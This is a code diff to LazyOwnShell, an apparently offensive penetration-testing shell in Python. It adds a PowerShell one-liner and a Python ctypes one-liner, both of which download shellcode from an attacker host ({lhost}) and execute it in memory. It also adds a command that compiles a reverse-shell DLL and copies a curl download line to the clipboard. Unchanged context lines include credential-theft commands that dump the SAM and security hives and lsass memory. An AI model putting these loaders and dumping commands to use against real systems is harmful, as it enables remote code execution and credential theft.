@@ -223,14 +223,18 @@ class LazyOwnShell(Cmd):
         :return: A message indicating the result of the command execution.
         :rtype: str
         """
-
-        self.output = self.get_output
+        self.output = ""
         try:
-            self.onecmd(command)  # Ejecuta el comando directamente
-            self.output = "Command executed successfully."
-            return self.output
+            original_stdout = sys.stdout
+            sys.stdout = io.StringIO()
+            self.onecmd(command)
+            self.output = sys.stdout.getvalue()
+            sys.stdout = original_stdout
+            
+            return "Command executed successfully."
         except Exception as e:
             self.output = str(e)
+            return "An error occurred: " + str(e)
 
     def emptyline(self):
         """
@@ -4612,7 +4616,8 @@ class LazyOwnShell(Cmd):
             ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
             ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
             ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
-            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full')
+            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
+            ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"')
         ]
         
         for idx, (alias, cmd) in enumerate(commands_list):
@@ -6369,7 +6374,8 @@ class LazyOwnShell(Cmd):
 
         exclusions = [
             'download_resources.sh',
-            'win', 
+            'win',
+            'lin',
             'users.txt'
         ]
 
@@ -7624,6 +7630,7 @@ class LazyOwnShell(Cmd):
         run_script_path = "run"
         subprocess.run(["proxychains", "bash", run_script_path] + sys.argv[1:])
         sys.exit()
+        
     def do_shellcode(self, line):
         """
         Generates a Python one-liner to execute shellcode from a given URL.
@@ -7649,7 +7656,111 @@ class LazyOwnShell(Cmd):
             print_error(f"shellcode.bin must exist, you need {GREEN}run lazymsfvenom {RED}or {GREEN}venom {RED}before {GREEN}shellcode {RED}command")
             return
         command = f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'
-        copy2clip(command)
+        command1 = f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'
+        print_msg(f"\n{RED}    1 ) {WHITE}" + command) 
+        print_msg(f"\n{RED}    2 ) {WHITE}" + command1)
+        choice = input("\nChoice option 1 or 2: ")
+        if choice == "1":
+            copy2clip(command)
+        else:
+            copy2clip(command1)
+        return
+
+    def do_skipfish(self, line):
+        """
+        This function executes the web security scanning tool Skipfish 
+        using the provided configuration and parameters. It allows 
+        scanning a specified target (rhost) and saves the results 
+        in a designated output directory.
+
+        Parameters:
+        - self: Refers to the instance of the class in which this function is defined.
+        - line: A string that may contain additional options to modify the scanning behavior.
+
+        Function Flow:
+        1. Default values are set for the target IP (rhost), port (port), and output directory (outputdir).
+        2. The validity of the target (rhost) is checked using the `check_rhost` function.
+        3. If no argument is provided in `line`, a `skipfish` command is constructed using the default values.
+        4. If `line` starts with 'url', the URL configured in `self.params['url']` is retrieved and used to construct the `skipfish` command.
+        5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits.
+        6. The constructed `skipfish` command is displayed on the console and executed using `os.system`.
+
+        Note:
+        - The function assumes that the `skipfish` tool is installed on the system.
+        - The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
+        - The wordlist used by Skipfish is specified in `wordlist`.
+        """
+        
+        port = 80
+        s = ''
+        
+        wordlist = '/usr/share/skipfish/dictionaries/complete.wl'
+        rhost = self.params['rhost']
+        
+        if not check_rhost(rhost):
+            return
+        outputdir = f'sessions/{rhost}/skipfish/'
+        if not line:
+            command = f"skipfish -o {outputdir} -S {wordlist} http{s}://{rhost}:{port}"
+        else:
+            if line.startswith('url'):
+                url = self.params['url']
+                if not url:
+                    print_error(f"You need set the url if use the parametter url ex: {GREEN}set url http://url.ext/")
+                    return
+                command = f"skipfish -o {outputdir} -S {wordlist} {url}"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def do_createdll(self,line):
+        """
+        Create a Windows DLL file using MinGW-w64.
+
+        This function prompts the user to select between creating a 32-bit 
+        or 64-bit DLL. It checks if MinGW-w64 is installed, and if not, 
+        it installs it. The user must provide a filename for the DLL, 
+        which will be created from the `sessions/rev.c` source file. 
+        The function constructs the appropriate command to compile 
+        the DLL based on the user's choice and executes it. 
+        It also opens the `rev.c` file in a text editor for any modifications 
+        before compilation.
+
+        Parameters:
+        - line (str): The name of the DLL file to be created. 
+                    Must be provided by the user.
+
+        Usage:
+        - Choose "1" for 32-bit or "2" for 64-bit compilation.
+        - Ensure that shellcode is created beforehand using 
+        the `lazymsfvenom` or `venom` options 13 or 14 
+        to replace in `sessions/rev.c`.
+        """
+        lhost = self.params["lhost"]
+        if not check_lhost(lhost):
+            return
+        print_msg(f"{RED}1) {BLUE}Win32 Bit, {RED}2) {CYAN}Win64 Bit")
+        choice = input(f"    {MAGENTA}[?] Choice (1 or 2): ")
+        print_warn(f"Remeber: {GREEN}run lazymsfvenom {YELLOW}or {GREEN}venom {YELLOW} option 13 or 14, to create shellcode before! to replace in {RED}sessions/win/rev.c")
+        if not is_binary_present("x86_64-w64-mingw32-gcc") or not is_binary_present("i686-w64-mingw32-gcc"):
+            print_warn("mingw-w64 is not present in the system installing...")
+            os.system("sudo apt install mingw-w64")
+        if not line:
+            print_error("You need pass the name of the ddl file")
+            return
+
+        if choice == "1":
+            command = f"x86_64-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
+        else:
+            command = f"i686-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
+
+        cmd = "nano sessions/win/rev.c"
+        print_msg(f"Attemp to: {cmd}")
+        os.system(cmd)
+        print_msg(f"Try... {command}")
+        os.system(command)
+        cmd = f"curl -o {line} http://{lhost}/{line}"
+        copy2clip(cmd)
         return
 
 def xor_encrypt_decrypt(data, key):
